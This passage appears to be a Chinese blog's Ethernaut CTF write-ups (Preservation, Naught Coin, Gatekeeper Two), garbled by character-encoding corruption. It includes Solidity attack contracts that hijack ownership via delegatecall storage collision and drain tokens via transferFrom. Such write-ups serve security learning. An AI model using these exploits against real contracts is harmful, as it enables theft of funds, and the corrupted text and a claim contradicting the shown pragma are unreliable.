å¦‚æœ**LibraryContract**ä¿®æ”¹çŠ¶æ€ï¼Œå®ƒä¸ä¼šä¿®æ”¹è‡ªå·±çš„çŠ¶æ€ï¼Œè€Œæ˜¯ä¿®æ”¹è°ƒç”¨è€…ï¼ˆ**Preservation**ï¼‰çš„çŠ¶æ€ï¼è¿™æ„å‘³ç€å½“LibraryContract.setTimeæ›´æ–°storedTimeçŠ¶æ€å˜é‡æ—¶ï¼Œä¸æ˜¯ä»å®ƒè‡ªå·±çš„åˆçº¦æ›´æ–°å˜é‡ï¼Œè€Œæ˜¯æ›´æ–°è°ƒç”¨è€…åˆçº¦çš„slot0ä¸­çš„å˜é‡ï¼Œå³timeZone1Libraryåœ°å€ã€‚ setSecondTimeæ‰§è¡Œå‡½æ•°æ—¶ä¼šå‘ç”ŸåŒæ ·çš„äº‹æƒ…ï¼Œå®ƒå°†æ›´æ–°åˆçº¦slot0Preservationä¸­çš„å˜é‡ã€‚ æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Ÿæœ‰æ²¡æœ‰åŠæ³•ä¿®æ”¹delegatecallå­˜å‚¨çŠ¶æ€å˜é‡ä¿¡æ¯çš„ç¬¬ä¸‰ä¸ªå­˜å‚¨æ§½ownerï¼Ÿ å¥½å§ï¼Œä¸æ˜¯ç›´æ¥æ¥è‡ªsetFirstTimeï¼Œå¦åˆ™ä¼šä¿®æ”¹slot0setSecondTimeå˜é‡çš„å€¼ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°†slot0åœ°å€æ›¿æ¢ä¸ºæˆ‘ä»¬å·²éƒ¨ç½²çš„åˆçº¦çš„åœ°å€ï¼Œè¿™å°†æ¨¡æ‹Ÿç›¸åŒçš„å¸ƒå±€å­˜å‚¨å¹¶ä¸”ç¡®å®ä¼šæ›´æ–°slot3å˜é‡æ€ä¹ˆåŠï¼Ÿ ç¬¬äºŒç±»åˆ†ææ–¹æ³• ä¿å­˜åˆçº¦ä½¿ç”¨åœ°å€ä¸­åˆ†é…çš„åˆçº¦timeZone1Libraryå’ŒtimeZone2Libraryåº“åˆçº¦ã€‚å› æ­¤ï¼Œå¯¹è¿™äº›åˆçº¦çš„æ‰€æœ‰è°ƒç”¨éƒ½æ˜¯åœ¨ä¿å­˜åˆçº¦ä¸­å®Œæˆçš„delegatecallï¼Œä¸ä¼šè§¦åŠæ¯ä¸ªåˆçº¦çš„å­˜å‚¨LibraryContractï¼Œè€Œæ˜¯è§¦åŠä¿å­˜åˆçº¦çš„å­˜å‚¨ã€‚ å½“æˆ‘ä»¬storedTimeé€šè¿‡åº“åˆçº¦ä¸­çš„å‡½æ•°ä¿®æ”¹å˜é‡æ—¶ï¼Œæˆ‘ä»¬ä¸æ˜¯åœ¨åº“æˆ–ä¿å­˜åˆçº¦ä¸­ä¿®æ”¹delegatecallï¼Œè€Œæ˜¯åœ¨ä¿å­˜åˆçº¦ä¸­å ç”¨ç›¸åº”å­˜å‚¨æ§½çš„å˜é‡ã€‚setTime()``storedTimestoredTime å› æ­¤ï¼Œè°ƒç”¨setFirstTime()orsetSecondTime()å°†timeZone1Libraryä½¿ç”¨æˆ‘ä»¬ä½œä¸º ä¼ é€’çš„ä»»ä½•å€¼è¿›è¡Œä¿®æ”¹_timeStampã€‚å› æ­¤ï¼Œä¸ºäº†åˆ©ç”¨åˆçº¦å¹¶æˆä¸ºownerï¼Œæˆ‘ä»¬éœ€è¦éƒ¨ç½²ä¸€ä¸ªä¸Preservation å…·æœ‰ç›¸åŒå­˜å‚¨å¸ƒå±€çš„åˆçº¦ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„æ”»å‡»è€…åˆçº¦åº”è¯¥å®šä¹‰ï¼š 123address public timeZone1Library;address public timeZone2Library;address public owner; ä¸ä¿å­˜çš„é¡ºåºå®Œå…¨ç›¸åŒã€‚ æ­¤å¤–ï¼Œæ”»å‡»è€…åˆçº¦ä¸­å¿…é¡»å®šä¹‰ä¸¤ä¸ªé™„åŠ åŠŸèƒ½ï¼š ä¸€ä¸ªsetTime()å¸¦æœ‰uint256å‚æ•°çš„å‡½æ•°ï¼Œåœ¨æ”»å‡»è€…åˆçº¦çš„æƒ…å†µä¸‹ï¼Œå®ƒå°†ä¿®æ”¹å…¶ç¬¬ä¸‰ä¸ªå†…å­˜æ§½ä¸­çš„å˜é‡ï¼Œå› æ­¤ownerã€‚è¿™ä¸ªå˜é‡çš„åç§°æ— å…³ç´§è¦ï¼Œå› ä¸ºæˆ‘ä»¬åªå¯¹ä¿®æ”¹ Preservation ä¸­çš„ç¬¬ 3 ä¸ªå†…å­˜æ§½æ„Ÿå…´è¶£ï¼Œä½†ä¸ºäº†ä¿æŒä¸€è‡´ï¼Œæˆ‘ä¹Ÿå°†å…¶å‘½åä¸ºownerã€‚ 123function setTime(uint256) public &#123; owner = tx.origin;&#125; åœ¨ä¿æŠ¤ä¸­è°ƒç”¨çš„å‡½æ•°setFirstTime()ï¼Œä»¥ä½¿timeZone1Libraryæ”»å‡»è€…ç­¾è®¢åˆåŒã€‚å¦‚æœæ¯ä¸ª LibraryContract éƒ½ä½¿ç”¨ä¸ Preservation ç›¸åŒçš„å¸ƒå±€è¿›è¡Œæ­£ç¡®ç¼–ç ï¼Œåˆ™ Preservation åˆçº¦ä¸ä¼šä»¥è¿™ç§æ–¹å¼å—åˆ°æ”»å‡»ã€‚ 123function setFirstTimeExploit() external &#123; preservationContract.setFirstTime(uint256(address(this)));&#125; preservationContractä¿å­˜åˆåŒçš„æ¥å£åœ¨å“ªé‡Œã€‚ å› æ­¤æµç¨‹å¦‚ä¸‹ï¼š é€šè¿‡ä»æ”»å‡»è€…åˆçº¦è°ƒç”¨æ¥åˆ›å»ºæ”»å‡»è€…åˆçº¦timeZone1Libraryåœ°å€setFirstTime()ã€‚ ä½¿ç”¨setFirstTime()ä»»ä½•æ— ç¬¦å·æ•´æ•°ä½œä¸ºå‚æ•°è°ƒç”¨ä¿å­˜åˆçº¦ï¼Œè¯¥åˆçº¦setTime()åœ¨æ”»å‡»è€…åˆçº¦ä¸­æ‰§è¡Œï¼Œç”Ÿæˆowneræˆ‘ä»¬çš„åŸå§‹åœ°å€ã€‚ å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ 12345678910111213141516contract Hack &#123; address public timeZone1Library; address public timeZone2Library; address public owner; function attack(Preservation target) external &#123; target.setFirstTime(uint256(uint160(address(this)))); target.setFirstTime(uint256(uint160(msg.sender))); require(target.owner() == msg.sender, &quot;hack failed&quot;); &#125; function setTime(uint _owner) external &#123; owner = address(uint160(_owner)); &#125;&#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x5E4d571ae5dAA2A4D530a1a5B89C11d6fEae8440 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œè°ƒç”¨Hack åˆçº¦ä¸­çš„attack() å‡½æ•°ï¼Œå½¢å‚æ˜¯å®ä¾‹åœ°å€ 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Naught Coin","slug":"CTFS/ethernaut/Naught Coin","date":"2023-01-18T07:10:10.000Z","updated":"2023-01-18T07:10:10.000Z","comments":true,"path":"2023/01/18/CTFS/ethernaut/Naught Coin/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/CTFS/ethernaut/Naught%20Coin/","excerpt":"","text":"Naught Coin1. é¢˜ç›®è¦æ±‚ 1.1 NaughtCoin æ˜¯ä¸€ç§ ERC20 ä»£å¸ï¼Œè€Œä¸”æ‚¨å·²ç»æŒæœ‰è¿™äº›ä»£å¸ã€‚é—®é¢˜æ˜¯æ‚¨åªèƒ½åœ¨ 10 å¹´ä¹‹åæ‰èƒ½è½¬ç§»å®ƒä»¬ã€‚æ‚¨èƒ½å°è¯•å°†å®ƒä»¬è½¬ç§»åˆ°å¦ä¸€ä¸ªåœ°å€ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥è‡ªç”±ä½¿ç”¨å®ƒä»¬å—ï¼Ÿé€šè¿‡å°†æ‚¨çš„ä»£å¸ä½™é¢å˜ä¸º 0 æ¥å®Œæˆæ­¤å…³å¡ã€‚ è¿™å¯èƒ½æœ‰ç”¨ ERC20æ ‡å‡† OpenZeppelinä»“åº“ 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&#x27;; contract NaughtCoin is ERC20 &#123; // string public constant name = &#x27;NaughtCoin&#x27;; // string public constant symbol = &#x27;0x0&#x27;; // uint public constant decimals = 18; uint public timeLock = block.timestamp + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123; player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(block.timestamp &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; 2. åˆ†æ 2.1 é€šè¿‡è®©æ‚¨çš„ä»£å¸ä½™é¢ä¸º 0 æ¥å®Œæˆæ­¤çº§åˆ« 2.2 ***tipsï¼š**åœ¨*constructor**. *_mint*åœ¨æ‰§è¡Œåˆçº¦*emit*äº‹ä»¶**å*Transfer*ï¼Œä¸çŸ¥é“ OpenZeppelin*_mint*å‡½æ•°çš„æœ¬æœºå®ç°å·²ç»æ˜¯*emit*äº‹ä»¶*Transfer* è¦è§£å†³è¿™ä¸ªåˆçº¦ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ ERC20 ä»£å¸çš„ EIPï¼ˆä»¥å¤ªåŠæ”¹è¿›ææ¡ˆï¼‰æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œä»¥åŠ OpenZeppelin æ˜¯å¦‚ä½•å®ç°å®ƒçš„ï¼ˆè¯¥åˆçº¦ä½¿ç”¨çš„æ˜¯ OpenZeppelin æ¡†æ¶åº“ï¼‰ã€‚ æ‚¨å¯ä»¥ä»è¿™äº›é“¾æ¥ä¸­æ‰¾åˆ°æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ï¼š ä»¥å¤ªåŠ EIP-20 OpenZeppelin ERC20 æ–‡æ¡£ OpenZeppelin ERC20 å®ç° è½¬ç§»ä»£å¸æœ‰ä¸¤ç§æ–¹å¼ï¼š é€šè¿‡transferå…è®¸msg.senderç›´æ¥å°†ä»£å¸è½¬ç§»åˆ°recipient é€šè¿‡transferFromå…è®¸å¤–éƒ¨ä»»æ„senderï¼ˆå¯èƒ½æ˜¯ä»£å¸æœ¬èº«çš„æ‰€æœ‰è€…ï¼‰ä»£è¡¨æ‰€æœ‰è€…å°†amountä»£å¸è½¬ç§»åˆ°recipient. åœ¨å‘é€è¿™äº›ä»£å¸ä¹‹å‰ï¼Œæ‰€æœ‰è€…å¿…é¡»å·²æ‰¹å‡†ç®¡ç†senderè¯¥æ•°é‡çš„ä»£å¸ å› ä¸ºtransferæ–¹æ³•å·²ç»overridedçº¦å®šå¥½äº†NaughtCoinï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡½æ•°æ¥è§„é¿é™åˆ¶transferFromã€‚ è¿™æ˜¯æˆ‘ä»¬éœ€è¦åšçš„ï¼š åˆ›å»ºä¸€ä¸ªäºŒçº§è´¦æˆ·ï¼Œå°†æˆ‘ä»¬æ‰€æœ‰çš„ä»£å¸è½¬ç§»åˆ° 2) åœ¨è°ƒç”¨ä¹‹å‰æ‰¹å‡†æˆ‘ä»¬è‡ªå·±ç®¡ç†å…¨éƒ¨ä»£å¸transferFrom3) è°ƒç”¨transferFrom(player, secondaryAccount, token.balanceOf(player))4) éšå¿ƒæ‰€æ¬²åœ°ä½¿ç”¨ä»£å¸ï¼ 1NaughtCoin`åˆçº¦åº”è¯¥å®æ–½ä»€ä¹ˆæ‰èƒ½çœŸæ­£é”å®šæˆ‘ä»¬çš„ä»£å¸**10 å¹´**ï¼Ÿä»–ä»¬å¯ä»¥å®ç°EIP-20 å®šä¹‰çš„**ä¸€ä¸ªæŒ‚é’©**`overriding`ï¼Œç§°ä¸º.`transfer``_beforeTokenTransfer å½“å‘ç”Ÿä»»ä½•ç±»å‹çš„ä»¤ç‰Œä¼ è¾“æ—¶ï¼Œå°†è°ƒç”¨æ­¤æŒ‚é’©ï¼š mintï¼ˆä»åœ°å€è½¬ç§»0xåˆ°ç”¨æˆ·ï¼‰ burnï¼ˆä»ç”¨æˆ·è½¬ç§»åˆ°0xåœ°å€ï¼‰ transfer transferFrom é€šè¿‡è¿™æ ·åšï¼Œä»–ä»¬å¯ä»¥é˜²æ­¢è¿™ç§åˆ©ç”¨ã€‚ 2.3 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ interface INaughtCoin &#123; function player() external view returns (address); &#125; contract Hack &#123; function pwn(IERC20 coin) external &#123; address player = INaughtCoin(address(coin)).player(); uint bal = coin.balanceOf(player); coin.transferFrom(player, address(this), bal); &#125; &#125; 1234567- 2.4 è§£é¢˜æ­¥éª¤ä¸ºï¼š- ``` // 1.Deploy // 2.coin.approve(hack, amount) // 3.pwn() 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x34df3070B62B46bCBc4d0a2cbCcd670109041b8a 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ Hack 3.3 æ ¹æ®å…³å¡å®ä¾‹åœ°å€ ç”Ÿæˆ IECR20 åˆçº¦ 3.4 è°ƒç”¨IECR20 åˆçº¦ä¸­çš„balanceOf() å‡½æ•°æŸ¥çœ‹å½“å‰è´¦æˆ·ä½™é¢ 3.5 å†è°ƒç”¨IECR20 åˆçº¦çš„approve() å‡½æ•°ï¼Œä¼ å…¥Hack åˆçº¦åœ°å€å’Œ æ‰€æŸ¥è´¦æˆ·ä½™é¢ 3.6 è°ƒç”¨Hack åˆçº¦ä¸­çš„pwn() å‡½æ•° ä¼ å…¥å…³å¡å®ä¾‹ 3.7 å›åˆ°IECR20 åˆçº¦ä¸­è°ƒç”¨balanceOf() å‡½æ•°æŸ¥çœ‹å½“å‰è´¦æˆ·ä½™é¢ 3.8 æäº¤å®ä¾‹ 3.9 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Gatekeeper Two","slug":"CTFS/ethernaut/GatekeeperTwo","date":"2023-01-09T05:02:15.000Z","updated":"2023-01-09T05:02:15.000Z","comments":true,"path":"2023/01/09/CTFS/ethernaut/GatekeeperTwo/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/CTFS/ethernaut/GatekeeperTwo/","excerpt":"","text":"Gatekeeper Two1. é¢˜ç›®è¦æ±‚ 1.1 é¢˜ç›®ï¼šè¿™ä¸ªå®ˆé—¨äººå¸¦æ¥äº†ä¸€äº›æ–°çš„æŒ‘æˆ˜, åŒæ ·çš„éœ€è¦æ³¨å†Œä¸ºå‚èµ›è€…æ¥å®Œæˆè¿™ä¸€å…³ è¿™å¯èƒ½æœ‰å¸®åŠ©: æƒ³ä¸€æƒ³ä½ ä»ä¸Šä¸€ä¸ªå®ˆé—¨äººé‚£å­¦åˆ°äº†ä»€ä¹ˆ. ç¬¬äºŒä¸ªé—¨ä¸­çš„ assembly å…³é”®è¯å¯ä»¥è®©ä¸€ä¸ªåˆçº¦è®¿é—®éåŸç”Ÿçš„ vanilla solidity åŠŸèƒ½. å‚è§ here . extcodesize å‡½æ•°å¯ä»¥ç”¨æ¥å¾—åˆ°ç»™å®šåœ°å€åˆçº¦çš„ä»£ç é•¿åº¦ - ä½ å¯ä»¥åœ¨è¿™ä¸ªé¡µé¢å­¦ä¹ åˆ°æ›´å¤š yellow paper. ^ ç¬¦å·åœ¨ç¬¬ä¸‰ä¸ªé—¨é‡Œæ˜¯ä½æ“ä½œ (XOR), åœ¨è¿™é‡Œæ˜¯ä»£è¡¨å¦ä¸€ä¸ªå¸¸è§çš„ä½æ“ä½œ (å‚è§ here). Coin Flip å…³å¡ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å‚è€ƒ. 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; 2. åˆ†æ 2.1 ä¸ Gatekeeper One ä¸€æ ·ï¼Œæˆ‘ä»¬å¿…é¡»æˆåŠŸé€šè¿‡å‡½æ•°çš„ 3 æ¬¡ä¿®é¥°ç¬¦æ£€æŸ¥enter()æ‰èƒ½åˆ›å»ºentrantæˆ‘ä»¬çš„åœ°å€ 2.2 äº¤æ˜“å¿…é¡»ä»åˆçº¦å‘é€ï¼Œä»¥ä¾¿åˆçº¦åœ°å€ ( msg.sender) ä¸åˆçº¦è°ƒç”¨è€… ( tx.origin) ä¸åŒã€‚ msg.senderå’Œtx.origin åœ¨å‡½æ•°è°ƒç”¨è€…ä¸Šè¿è¡Œ solidity æ±‡ç¼–æ“ä½œç çš„ç»“æœextcodesize()è¿”å›è°ƒç”¨è€…åˆçº¦ä»£ç çš„é•¿åº¦ï¼Œä½†æ˜¯ï¼Œå½“æˆ‘ä»¬ä»åˆçº¦è°ƒç”¨çš„æ„é€ å‡½æ•°æ‰§è¡Œå¤–éƒ¨è°ƒç”¨æ—¶ï¼Œextcodesize()è¿”å›é›¶ï¼Œå› ä¸ºåˆçº¦åœ¨æ„é€ æœŸé—´æ²¡æœ‰å¯ç”¨çš„æºä»£ç . Consensys æ™ºèƒ½åˆçº¦æœ€ä½³å®è·µé¡µé¢ä¸­çš„æ­¤é¡µé¢è¯¦ç»†ä»‹ç»äº†å®ƒã€‚å› æ­¤ï¼Œè¿™extcodesize()ä¸æ˜¯æ£€æŸ¥å¤–éƒ¨è°ƒç”¨æ˜¯ç”±åˆçº¦è¿˜æ˜¯å¤–éƒ¨æ‹¥æœ‰çš„å¸æˆ·æ‰§è¡Œçš„å¯é æ–¹æ³•ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œè¦åšçš„å°±æ˜¯è¿è¡Œenter()ä»è°ƒç”¨åˆçº¦çš„æ„é€ å‡½æ•°è°ƒç”¨å‡½æ•°çš„ä»£ç ã€‚ æŒ‰ä½XORå’Œé€šè¿‡å®ƒæ“ä½œçš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å®ƒè‡ªå·±çš„é€†ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æœ‰å¦‚æœï¼š 1uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 ä¸ºçœŸï¼Œåˆ™ï¼š 1uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey) ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å› æ­¤ï¼Œ*æˆ‘ä»¬ä¸éœ€è¦_gateKey*ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°å°†ç»“æœuint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œenter()ä½†å¼ºåˆ¶è½¬æ¢ä¸ºbytes8as è¿™å°±æ˜¯æ‰€enter()éœ€è¦çš„ã€‚ å‚è€ƒåšå®¢ é—¨ 1ï¼šmsg.senderå’Œtx.origin è¦æ‰“å¼€è¿™æ‰‡é—¨ï¼Œæˆ‘ä»¬å¿…é¡»äº†è§£msg.senderå®ƒä»¬tx.originä¹‹é—´çš„åŒºåˆ«ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹ Solidity æ–‡æ¡£å¯¹è¿™äº›å…¨å±€å˜é‡çš„çœ‹æ³•ï¼š msg.sender( address): æ¶ˆæ¯çš„å‘é€è€…ï¼ˆå½“å‰é€šè¯ï¼‰ tx.origin( address): äº¤æ˜“çš„å‘é€æ–¹ï¼ˆå®Œæ•´çš„è°ƒç”¨é“¾ï¼‰ å½“äº¤æ˜“ç”± EOA è¿›è¡Œå¹¶ç›´æ¥ä¸æ™ºèƒ½åˆçº¦äº¤äº’æ—¶ï¼Œè¿™äº›å˜é‡å°†å…·æœ‰ç›¸åŒçš„å€¼ã€‚ä½†æ˜¯ï¼Œå¦‚æœå®ƒä¸ä¸­é—´äººåˆçº¦äº¤äº’Aï¼Œç„¶åBé€šè¿‡ç›´æ¥è°ƒç”¨ï¼ˆè€Œä¸æ˜¯ a delegatecallï¼‰ä¸å¦ä¸€ä¸ªåˆçº¦äº¤äº’ï¼Œé‚£ä¹ˆè¿™äº›å€¼å°†ä¸åŒã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼š msg.senderå°†æœ‰ EOA åœ°å€ tx.origin``Aå°†æœ‰åˆåŒçš„åœ°å€ å› ä¸ºä¸ºäº†gateOneä¸æ¢å¤ï¼Œæˆ‘ä»¬éœ€è¦è®©msg.sender != tx.originè¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»enterä»æ™ºèƒ½åˆçº¦è€Œä¸æ˜¯ç›´æ¥ä»ç©å®¶çš„ EOA è°ƒç”¨ã€‚ è¿™ä¸æ˜¯æŒ‘æˆ˜çš„ä¸€éƒ¨åˆ†ï¼Œä½†æˆ‘å»ºè®®æ‚¨é˜…è¯»æˆ‘åœ¨è¿›ä¸€æ­¥é˜…è¯»ä¸­åˆ—å‡ºçš„å…³äºä¸€äº›å®‰å…¨é—®é¢˜å’Œæœ€ä½³å®è·µtx.orginä»¥åŠä½•æ—¶ä¸åº”ä½¿ç”¨å®ƒçš„å†…å®¹ã€‚ å…³å¡2ï¼šèƒŒåçš„ç„æœºextcodesize ç¬¬äºŒä¸ªé—¨æ˜¯äº†è§£æ›´å¤šå…³äºåˆçº¦å¦‚ä½•éƒ¨ç½²ä»¥åŠåˆçº¦åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­çš„ç”Ÿå‘½å‘¨æœŸçš„ç»å¥½æœºä¼šã€‚ è®©æˆ‘ä»¬çœ‹çœ‹å‡½æ•°çš„ä»£ç ï¼š 12345678ä¿®é¥°ç¬¦ gateTwo() &#123; uint256 x; ç¨‹åºé›† &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; å¦‚æœè¿™æ˜¯æ‚¨ç¬¬ä¸€æ¬¡çœ‹åˆ°å…³é”®å­—assembly ï¼Œè¯·ä¸è¦å®³æ€•ã€‚è¿™å°±æ˜¯ Solidity å…è®¸æ‚¨ä½¿ç”¨ç§°ä¸ºYul. è¿™é‡Œä¸æ˜¯è®¨è®ºè¿™ä¸ªè¯é¢˜çš„åœ°æ–¹ï¼Œä½†å¦‚æœæ‚¨æƒ³äº†è§£æ›´å¤šï¼Œ Solidity æ–‡æ¡£ç½‘ç«™ä¸Šæœ‰å¤§é‡å…³äº Yul çš„å†…å®¹ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹è¿™ä¸¤ä¸ªæ“ä½œç åœ¨æ‰§è¡Œæ—¶åšäº†ä»€ä¹ˆï¼š CALLERæ“ä½œç è¿”å›è°ƒç”¨è€…å¸æˆ·çš„ 20 å­—èŠ‚åœ°å€ã€‚è¿™æ˜¯æ‰§è¡Œæœ€åä¸€æ¬¡è°ƒç”¨çš„å¸æˆ·ï¼ˆå§”æ‰˜è°ƒç”¨é™¤å¤–ï¼‰ã€‚ EXCODESIZEæ“ä½œç åœ¨æ‰§è¡Œæ—¶è¿”å›ä½œä¸ºå‚æ•°ä¼ é€’çš„åœ°å€çš„ä»£ç å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚ è¿™ä¸ªé—¨è¦æ±‚çš„codeå¤§å°callerå¿…é¡»æ˜¯0ã€‚ å¦‚æœcalleræ˜¯ä¸€ä¸ªæ€»æ˜¯è¿”å›é›¶çš„ EOAï¼ˆå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼‰ï¼Œä½†äº‹å®å¹¶éå¦‚æ­¤ï¼Œå› ä¸ºæ­£å¦‚æˆ‘ä»¬æ‰€è¯´ï¼Œmsg.senderç”±äºç¬¬ä¸€é—¨è¦æ±‚ï¼Œè°ƒç”¨è€… ( ) å¿…é¡»æ˜¯æ™ºèƒ½åˆçº¦ã€‚ æ™ºèƒ½åˆçº¦å¦‚ä½•å®ç°é›¶ä»£ç ï¼Ÿå¥½å§ï¼Œè¿™æ˜¯çœŸçš„æœ‰ä¸€ä¸ªç‰¹ä¾‹ã€‚æ™ºèƒ½åˆçº¦åœ¨ç¼–è¯‘æ—¶æœ‰ä¸¤ç§ä¸åŒçš„å­—èŠ‚ç ã€‚ åˆ›å»ºå­—èŠ‚ç æ˜¯ä»¥å¤ªåŠåˆ›å»ºåˆçº¦å’Œåªæ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°æ‰€éœ€çš„å­—èŠ‚ç  è¿è¡Œæ—¶å­—èŠ‚ç æ˜¯åˆçº¦çš„çœŸå®ä»£ç ï¼Œå­˜å‚¨åœ¨åŒºå—é“¾ä¸­çš„ä»£ç å°†ç”¨äºæ‰§è¡Œæ‚¨çš„æ™ºèƒ½åˆçº¦åŠŸèƒ½ å½“æ‰§è¡Œæ„é€ å‡½æ•°åˆå§‹åŒ–åˆçº¦å­˜å‚¨æ—¶ï¼Œå®ƒè¿”å›è¿è¡Œæ—¶å­—èŠ‚ç ã€‚ç›´åˆ°æ„é€ å‡½æ•°çš„æœ€åï¼Œåˆçº¦æœ¬èº«æ²¡æœ‰ä»»ä½•è¿è¡Œæ—¶å­—èŠ‚ç ï¼Œè¿™æ„å‘³ç€å¦‚æœä½ è°ƒç”¨address(contract).code.lengthå®ƒä¼šè¿”å›0ï¼ å¦‚æœæ‚¨æƒ³åœ¨ EVM çº§åˆ«é˜…è¯»æ›´å¤šç›¸å…³ä¿¡æ¯ï¼Œå¯ä»¥æ·±å…¥é˜…è¯» OpenZeppelin åšå®¢æ–‡ç« è§£æ„ Solidity åˆçº¦â€”â€”ç¬¬äºŒéƒ¨åˆ†ï¼šåˆ›å»ºä¸è¿è¡Œæ—¶ å› æ­¤ï¼Œè¦é€šè¿‡ç¬¬äºŒé“é—¨ï¼Œæˆ‘ä»¬åªéœ€è¦ä»æ™ºèƒ½åˆçº¦enterä¸­è°ƒç”¨å³å¯ï¼Exploiter``constructor Gate 3ï¼šé“¸é€ ã€å‘ä¸‹é“¸é€ å’Œä½è¿ç®— æœ€åä¸€æ‰‡é—¨æ˜¯å¦ä¸€æ‰‡è®©ä½ å¤§åƒä¸€æƒŠçš„é—¨ã€‚ä½ å‡†å¤‡å¥½äº†å—ï¼Ÿ æˆ‘ä»¬å†æ¬¡è®¨è®ºç±»å‹å’Œä½è¿ç®—ä¹‹é—´çš„è½¬æ¢ æ¥çœ‹çœ‹éœ€æ±‚uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 åˆçº¦æ˜¯ç”¨0.8.xä¹‹å‰çš„Solidityç‰ˆæœ¬ç¼–è¯‘çš„ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œæ•°å­¦è¿ç®—æ—¶ä¸ä¼šå›æ»šuint64(0) - 1ã€‚æ­¤æ“ä½œæ˜¯è¡¨è¾¾â€œç»™æˆ‘ auint64å¯ä»¥å®¹çº³çš„æœ€å¤§æ•°é‡â€çš„â€œæ—§æ–¹æ³•â€ã€‚ä½ å¯ä»¥é€šè¿‡åšæ¥è¡¨è¾¾åŒæ ·çš„äº‹æƒ…type(uint64).maxã€‚ è¯¥éƒ¨åˆ†ä»ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯åˆåŒï¼‰ä¸­bytes8(keccak256(abi.encodePacked(msg.sender)))è·å–ä¸å¤ªé‡è¦çš„å†…å®¹å¹¶å°†å®ƒä»¬è½¬æ¢ä¸º8 